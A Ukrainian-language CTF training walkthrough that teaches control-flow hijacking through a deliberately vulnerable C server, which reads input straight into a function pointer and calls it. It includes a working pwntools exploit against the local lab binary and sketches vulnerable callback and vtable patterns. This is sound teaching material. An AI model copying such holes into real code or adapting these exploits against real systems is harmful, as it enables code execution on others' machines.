# Stage 04: Demo No Offset - Пряме виконання функції

## 🎯 Мета завдання

Зрозуміти **концепцію перенаправлення виконання** без складних buffer overflow. Це максимально спрощений сценарій: ви просто надсилаєте адресу функції, і вона виконується.

## 📚 Що ви дізнаєтесь

- Що таке функціональний покажчик (function pointer)
- Як адреса функції стає викликом цієї функції
- Як використовувати `elf.symbols` в pwntools
- Чому PIE OFF робить адреси передбачуваними
- Основи перенаправлення потоку виконання
- Як працює виклик функції через покажчик

## 🔧 Необхідні інструменти

```bash
# Python та pwntools
pip3 install pwntools

# Для перевірки адрес
sudo apt install binutils  # objdump, readelf
```

## 📖 Теоретична основа

### Що таке функціональний покажчик?

**Функціональний покажчик** - це змінна, яка зберігає адресу функції в пам'яті.

```c
void hello() {
    printf("Hello!\n");
}

int main() {
    // fp - функціональний покажчик
    void (*fp)(void) = hello;  // fp тепер вказує на hello

    fp();  // Викликає hello()! Виведе "Hello!"

    return 0;
}
```

### Анатомія виклику функції

```
Пам'ять програми:
┌─────────────────────┐
│  0x401000: main()   │
│  0x401136: win()    │  ← Ця адреса!
│  0x401200: ...      │
└─────────────────────┘

Код:
void (*fp)(void) = (void(*)(void))0x401136;  // fp = адреса win()
fp();  // Процесор стрибає на 0x401136 і виконує win()!
```

### Як це працює на рівні процесора?

```asm
; Звичайний виклик функції
call win          ; Процесор: "Перейди на адресу win"

; Виклик через покажчик (наш випадок)
mov rax, 0x401136 ; Помістити адресу в регістр
call rax          ; Виконати функцію за адресою в rax
```

## 💻 Аналіз коду сервера

Давайте детально розберемо `server.c`:

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

// Функція-ціль: ми хочемо її викликати
__attribute__((noreturn)) void win(void){
    puts("FLAG{STAGE4_DIRECT_JUMP}");
    fflush(stdout);
    _exit(0);
}

int main(void){
    // Оголошуємо функціональний покажчик, спочатку NULL
    void (*fp)(void) = NULL;

    // Читаємо 8 байт (64-bit адресу) з stdin
    ssize_t n = read(0, &fp, 8);

    // Якщо прочитали не 8 байт - виходимо
    if(n != 8) return 0;

    // ВИКЛИКАЄМО функцію за адресою, яку ми надіслали!
    fp();

    return 0;
}
```

### Що тут відбувається покроково:

**Крок 1:** Програма оголошує покажчик `fp`:
```c
void (*fp)(void) = NULL;
```
- `fp` - це змінна розміром 8 байт (на 64-bit системі)
- Спочатку вона NULL (0x0000000000000000)

**Крок 2:** Читає 8 байт з вводу **безпосередньо в fp**:
```c
read(0, &fp, 8);
```
- `&fp` - адреса самої змінної fp в пам'яті
- Що б ви не відправили, буде записано в fp

**Крок 3:** Викликає функцію за адресою з fp:
```c
fp();
```
- Якщо ми відправили `0x401136` (адресу win)
- Процесор стрибне на `0x401136` і виконає `win()`!

### Візуалізація пам'яті

**До читання:**
```
Stack:
┌─────────────┐
│ fp = 0x0000 │  ← NULL
└─────────────┘
```

**Ми відправляємо:** `\x36\x11\x40\x00\x00\x00\x00\x00` (адреса 0x401136)

**Після read():**
```
Stack:
┌─────────────┐
│ fp = 0x401136 │  ← Адреса win()!
└─────────────┘
```

**Після fp():**
```
Процесор стрибає на 0x401136:
→ win() виконується
→ FLAG{STAGE4_DIRECT_JUMP}
```

## 🚀 Покрокове рішення

### Крок 1: Збудуйте бінарник

```bash
cd stage04_demo_no_offset
./build.sh
```

Вивід:
```
[*] Building stage04_demo_no_offset...
[+] Built: ../build/stage04_demo_no_offset
[+] Binary has win() function at a fixed address
```

### Крок 2: Знайдіть адресу функції win()

## 🔍 Як ПРАВИЛЬНО читати objdump?

**Спосіб 1: Через objdump (найпоширеніший)**
```bash
objdump -d ../build/stage04_demo_no_offset | grep '<win>'
```

**Вивід:**
```
0000000000401136 <win>:
  401136:	f3 0f 1e fa          	endbr64
  40113a:	48 83 ec 08          	sub    $0x8,%rsp
```

**Розбір виводу:**
```
0000000000401136 <win>:
│               │ │    │
│               │ │    └─ Назва функції
│               │ └────── Символ що позначає функцію
│               └──────── Адреса з ПРОВІДНИМИ НУЛЯМИ
└──────────────────────── Повна 64-bit адреса
```

**ВАЖЛИВО для Python:**
```python
# ❌ НЕПРАВИЛЬНО (не синтаксис Python):
win_addr = 0000000000401136    # SyntaxError!

# ❌ НЕПРАВИЛЬНО (десяткове число):
win_addr = 401136              # Це 401136₁₀, а не 0x401136

# ✅ ПРАВИЛЬНО (hex з префіксом 0x):
win_addr = 0x401136            # Hex число в Python

# ✅ АБО прибираємо зайві нулі:
# З objdump: 0000000000401136
# В Python:  0x401136
```

**Швидкий спосіб конвертації:**
```bash
# Отримати адресу в правильному форматі:
objdump -d binary | grep '<win>' | awk '{print "0x" $1}' | head -1
# Вивід: 0x401136
```

**Спосіб 2: Через readelf**
```bash
readelf -s ../build/stage04_demo_no_offset | grep win
```

**Вивід:**
```
    62: 0000000000401136    30 FUNC    GLOBAL DEFAULT   16 win
```

**Розбір:**
- Колонка 2: `0000000000401136` - адреса функції
- Колонка 3: `30` - розмір функції в байтах
- Колонка 4: `FUNC` - тип символу (функція)
- Колонка 8: `win` - назва

**Спосіб 3: Через nm**
```bash
nm ../build/stage04_demo_no_offset | grep win
```

**Вивід:**
```
0000000000401136 T win
```
- `T` означає текстова секція (код)

**Спосіб 4: Через pwntools (НАЙКРАЩИЙ - автоматичний)**
```python
from pwn import *
elf = ELF('../build/stage04_demo_no_offset')
win_addr = elf.symbols['win']
print(f"win() at: {hex(win_addr)}")  # win() at: 0x401136
```

**Переваги pwntools:**
- ✅ Автоматично правильний формат
- ✅ Не треба парсити вивід
- ✅ Працює навіть якщо символи stripped (через дизасемблювання)

## ⚠️ Часті помилки новачків

### Помилка 1: "KeyError: 'win'"
```python
elf = ELF('./binary')
win = elf.symbols['win']  # KeyError: 'win'
```

**Причина:** Символи видалено (stripped binary)
```bash
file ./binary
# output: ELF 64-bit LSB executable, stripped  ← ПРОБЛЕМА!
```

**Рішення 1:** Знайти вручну через objdump
```bash
objdump -d ./binary | grep -A5 "FLAG"
# Шукайте функцію що містить рядок FLAG
```

**Рішення 2:** Використати іншу техніку (format string, ROP)

### Помилка 2: "Відправив адресу, нічого не працює"
```python
# ❌ НЕПРАВИЛЬНО (відправляє рядок, не байти):
io.send("0x401136")

# ❌ НЕПРАВИЛЬНО (відправляє int як є):
io.send(0x401136)

# ✅ ПРАВИЛЬНО (packed в байти little-endian):
io.send(p64(0x401136))
```

### Помилка 3: "Використав 32-bit packing на 64-bit програмі"
```python
# Перевірте архітектуру:
file ./binary
# ELF 64-bit ... ← Використовуй p64()
# ELF 32-bit ... ← Використовуй p32()

# 64-bit:
payload = p64(0x401136)   # 8 байт

# 32-bit:
payload = p32(0x401136)   # 4 байти
```

### Помилка 4: "Програма крашить з SIGSEGV"
**Можливі причини:**
1. Неправильна адреса
2. Неправильний packing (p32 замість p64)
3. Відправили не ті байти

**Debugging:**
```python
from pwn import *
context.log_level = 'debug'  # Показує ВСЕ

# Перевірте payload:
payload = p64(0x401136)
print(f"Payload hex: {payload.hex()}")
# Має бути: 3611400000000000 (little-endian)

# Перевірте довжину:
print(f"Length: {len(payload)}")  # Має бути 8
```

### Крок 3: Створіть exploit

Створіть файл `exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

# Завантажуємо бінарник для аналізу
elf = ELF('../build/stage04_demo_no_offset', checksec=False)

# Автоматично отримуємо адресу win()
win_addr = elf.symbols['win']
log.info(f"Адреса win(): {hex(win_addr)}")

# Запускаємо локальний процес
io = process('../build/stage04_demo_no_offset')

# Відправляємо адресу win() (8 байт, little-endian)
payload = p64(win_addr)
log.info(f"Відправляємо payload: {payload.hex()}")
io.send(payload)

# Отримуємо прапор
flag = io.recvall(timeout=1)
log.success(f"Прапор: {flag.decode().strip()}")

io.close()
```

### Крок 4: Запустіть exploit

```bash
chmod +x exploit.py
python3 exploit.py
```

### Крок 5: Отримайте прапор

Вивід:
```
[*] '/path/to/build/stage04_demo_no_offset'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Адреса win(): 0x401136
[+] Starting local process '../build/stage04_demo_no_offset': pid 12345
[*] Відправляємо payload: 3611400000000000
[+] Receiving all data: Done (24B)
[*] Process '../build/stage04_demo_no_offset' stopped with exit code 0
[+] Прапор: FLAG{STAGE4_DIRECT_JUMP}
```

## 🔍 Детальний розбір

### Чому PIE=OFF важливо?

```bash
checksec --file=../build/stage04_demo_no_offset
```

```
PIE:      No PIE (0x400000)
```

**PIE OFF означає:**
- Адреси функцій **фіксовані** при кожному запуску
- `win()` завжди на **0x401136** (або іншій фіксованій адресі)
- Не потрібен leak адреси

**Якби PIE ON:**
```
Запуск 1: win() на 0x555555554136
Запуск 2: win() на 0x55555557a136  ← Інша адреса!
Запуск 3: win() на 0x5555555f2136  ← Знову інша!
```
→ Потрібен був би витік адреси

### Що таке p64()?

`p64()` - це функція pwntools для **пакування** числа в байти.

```python
from pwn import *

# Число → Байти (Little Endian)
addr = 0x401136
packed = p64(addr)

print(f"Число:    {hex(addr)}")
print(f"Байти:    {packed}")
print(f"Hex:      {packed.hex()}")
print(f"Довжина:  {len(packed)} байт")
```

Вивід:
```
Число:    0x401136
Байти:    b'\x36\x11\x40\x00\x00\x00\x00\x00'
Hex:      3611400000000000
Довжина:  8 байт
```

**Little Endian** означає "молодший байт першим":
- `0x00401136` → байти: `36 11 40 00 00 00 00 00`
- Перший байт (36) - це найменший
- Останній байт (00) - це найстарший

### Чому саме 8 байт?

```c
read(0, &fp, 8);  // Читає рівно 8 байт
```

- На **64-bit системі** покажчик займає **8 байт** (64 біти)
- На **32-bit системі** покажчик займає **4 байти** (32 біти)

```
64-bit адреса:  0x0000000000401136  (8 байт)
32-bit адреса:  0x00401136          (4 байти)
```

## 🎓 Експерименти

### Експеримент 1: Відправте неправильну адресу

```python
#!/usr/bin/env python3
from pwn import *

io = process('../build/stage04_demo_no_offset')

# Відправляємо випадкову адресу
bad_addr = 0xdeadbeef
io.send(p64(bad_addr))

try:
    output = io.recvall(timeout=1)
    print(output)
except:
    print("Процес крашнувся (очікувано)")
```

Результат: **Segmentation fault** - процес намагається виконати код за неіснуючою адресою.

### Експеримент 2: Відправте адресу main()

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('../build/stage04_demo_no_offset', checksec=False)
io = process('../build/stage04_demo_no_offset')

# Відправляємо адресу main замість win
main_addr = elf.symbols['main']
log.info(f"Відправляємо адресу main: {hex(main_addr)}")
io.send(p64(main_addr))

# Що станеться?
try:
    output = io.recvall(timeout=2)
    print(output)
except:
    log.warning("Можливо зациклення або краш")
```

Результат: Програма **зациклиться** (main викликає себе знову і знову) або крашне.

### Експеримент 3: Відправте менше 8 байт

```python
#!/usr/bin/env python3
from pwn import *

io = process('../build/stage04_demo_no_offset')

# Відправляємо тільки 4 байти
io.send(b'AAAA')

try:
    output = io.recvall(timeout=1)
    print(f"Вивід: {output}")
except:
    print("Нічого не вийшло")
```

Результат: Програма **завершується** без виклику функції:
```c
if(n != 8) return 0;  // n = 4, тому виходимо
```

### Експеримент 4: Ручна перевірка через hexdump

```bash
# Створіть payload вручну
python3 -c "import sys; sys.stdout.buffer.write(b'\x36\x11\x40\x00\x00\x00\x00\x00')" > payload.bin

# Подивіться в hex
xxd payload.bin

# Запустіть
cat payload.bin | ../build/stage04_demo_no_offset
```

## 💡 Важливі концепції

### 1. Чому `__attribute__((noreturn))`?

```c
__attribute__((noreturn)) void win(void){
    puts("FLAG{STAGE4_DIRECT_JUMP}");
    fflush(stdout);
    _exit(0);  // Замість return
}
```

- `__attribute__((noreturn))` - підказка компілятору що функція не повернеться
- Використовується `_exit(0)` замість `return`
- Це **критично важливо**: якби win() зробила `return`, програма крашнула б (бо немає куди повертатись - ми прийшли не через call!)

### 2. Різниця між call та jmp

**Нормальний виклик (call):**
```asm
call win
; 1. Зберегти адресу повернення в стеку (push return_addr)
; 2. Перейти на win
; 3. Коли win робить ret, повернутись назад
```

**Наш випадок (пряме виконання):**
```asm
mov rax, 0x401136
call rax
; Або навіть:
jmp rax
```

Якщо `win()` зробить `ret`, процесор спробує повернутись за адресою зі стеку, але там **сміття** → краш!

Тому використовується `_exit(0)` - примусове завершення процесу.

### 3. Порівняння з майбутніми етапами

| Етап | Що контролюємо | Складність |
|------|----------------|------------|
| **Stage 04 (зараз)** | Просто адресу функції | ⭐☆☆☆☆ |
| Stage 05 | Адресу + правильний offset | ⭐⭐☆☆☆ |
| Stage 06 | Перезапис RIP через BOF | ⭐⭐☆☆☆ |
| Stage 07 | Leak адреси + BOF | ⭐⭐⭐☆☆ |
| Stage 08 | Leak + ROP chain | ⭐⭐⭐⭐☆ |

## 🔐 Зв'язок з реальною експлуатацією

### Де це зустрічається в реальності?

**Сценарій 1: Вразливість в парсері команд**
```c
void handle_command(char *cmd) {
    void (*handler)(void);

    // Вразливість: cmd напряму копіюється в handler
    memcpy(&handler, cmd, 8);
    handler();  // Викликаємо!
}
```

**Сценарій 2: Переповнення структури з callback**
```c
struct request {
    char data[64];
    void (*callback)(void);  // ← Можна перезаписати
};

void process(struct request *req) {
    // ... обробка ...
    req->callback();  // Виконання
}
```

**Сценарій 3: Use-After-Free з vtable**
```cpp
class Base {
    virtual void action() = 0;
};

// vtable містить покажчики на віртуальні функції
// Якщо перезаписати vtable → arbitrary code execution
```

## 📚 Наступні кроки

Після цього завдання ви розумієте:
- ✅ Як функціональні покажчики працюють
- ✅ Як адреса стає виконанням коду
- ✅ Чому PIE OFF полегшує експлуатацію
- ✅ Як використовувати pwntools для пакування адрес

**Готові до Stage 05**: Там додасться концепція **offset** - правильного місця для адреси в буфері.

## ✅ Чеклист виконання

- [ ] Зібрано бінарник через `build.sh`
- [ ] Знайдено адресу win() через objdump або pwntools
- [ ] Зрозуміло що таке функціональний покажчик
- [ ] Створено робочий exploit.py
- [ ] Отримано прапор FLAG{STAGE4_DIRECT_JUMP}
- [ ] Зрозуміло чому використовується p64()
- [ ] Зрозуміло чому важливо 8 байт
- [ ] Експериментували з неправильними адресами
- [ ] Зрозуміло різницю між call та jmp
- [ ] Готовий до Stage 05!

---

**Час виконання:** 10-15 хвилин
**Складність:** ⭐☆☆☆☆ (Тривіальна)
**Категорія:** PWN / Control Flow
**Ключові поняття:** Function pointers, PIE, Little Endian
